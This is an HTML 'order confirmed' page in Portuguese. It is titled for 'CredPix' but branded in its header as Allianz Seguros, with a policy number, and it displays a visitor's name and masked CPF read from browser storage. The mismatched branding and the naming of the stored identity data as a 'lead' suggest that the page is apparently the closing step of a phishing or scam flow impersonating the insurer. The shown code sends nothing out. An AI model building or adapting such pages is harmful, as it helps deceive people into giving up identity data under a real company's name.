  <title>Pedido Confirmado – CredPix</title>
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #f0f4fa; min-height: 100dvh; display: flex; flex-direction: column; }

    .m2-header { background: linear-gradient(135deg, #003781 0%, #0054b4 100%); padding: 24px 24px 28px; }
    .m2-header-top { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 18px; }
    .m2-brand { font-size: 18px; font-weight: 900; color: #fff; }
    .m2-policy-label { font-size: 10px; color: rgba(255,255,255,0.4); text-transform: uppercase; }
    .m2-policy-num { font-size: 16px; font-weight: 800; color: #93c5fd; }
    .m2-info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; background: rgba(255,255,255,0.06); border-radius: 12px; padding: 14px 16px; }
    .m2-info-label { font-size: 10px; color: rgba(255,255,255,0.35); letter-spacing: 2px; text-transform: uppercase; margin-bottom: 4px; }
    .m2-info-value { font-size: 14px; font-weight: 700; color: #fff; }

    .content { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 48px 20px; text-align: center; }

    .check-icon { width: 88px; height: 88px; background: #059669; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 24px; box-shadow: 0 4px 20px rgba(5,150,105,0.3); }
    .check-icon svg { width: 48px; height: 48px; stroke: #fff; }

    .title { font-size: 26px; font-weight: 800; color: #0f172a; margin-bottom: 12px; }
    .subtitle { font-size: 16px; color: #334155; line-height: 1.5; max-width: 320px; margin: 0 auto 16px; }
    .desc { font-size: 14px; color: #64748b; line-height: 1.6; max-width: 340px; margin: 0 auto; }

    .badge { display: inline-flex; align-items: center; gap: 6px; margin-top: 28px; background: #f0fdf4; border: 1.5px solid #86efac; border-radius: 999px; padding: 8px 20px; font-size: 14px; color: #059669; font-weight: 700; }
  </style>

<body>


<div class="m2-header">
    <div class="m2-header-top">
        <div class="m2-brand">Allianz Seguros</div>
        <div style="text-align:right;">
            <div class="m2-policy-label">APOLICE</div>
            <div class="m2-policy-num">#ALZ-1429</div>
        </div>
    </div>
    <div class="m2-info-grid">
        <div><div class="m2-info-label">Segurado</div><div class="m2-info-value" id="leadNome">Carregando...</div></div>
        <div><div class="m2-info-label">CPF</div><div class="m2-info-value" id="leadCpf">***.***.***-**</div></div>
    </div>
</div>
<script>
(function() {
    var nome = localStorage.getItem('nomeUsuario') || '';
    var cpf  = localStorage.getItem('cpfUsuario')  || '';
    var leadNomeEl = document.getElementById('leadNome');
    var leadCpfEl  = document.getElementById('leadCpf');
    if (leadNomeEl && nome) {
        var parts = nome.trim().split(/\s+/);
        leadNomeEl.textContent = parts.length > 1 ? parts[0] + ' ' + parts[parts.length - 1] : nome;
    }
    if (leadCpfEl && cpf) {
        var d = cpf.replace(/\D/g, '');
        if (d.length === 11) leadCpfEl.textContent = '***.' + d.slice(3,6) + '.' + d.slice(6,9) + '-**';
    }
})();
</script>

<div class="content">

  <div class="check-icon">
    <svg viewBox="0 0 24 24" fill="none" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
      <polyline points="20 6 9 17 4 12"></polyline>
    </svg>
  </div>

  <div class="title">Tudo certo!</div>
  <div class="subtitle">Seu pedido foi confirmado com sucesso.</div>
  <div class="desc">Nossa equipe irá analisar sua solicitação e você será informado sobre os próximos passos em breve.</div>

  <div class="badge">Pedido Confirmado ✓</div>
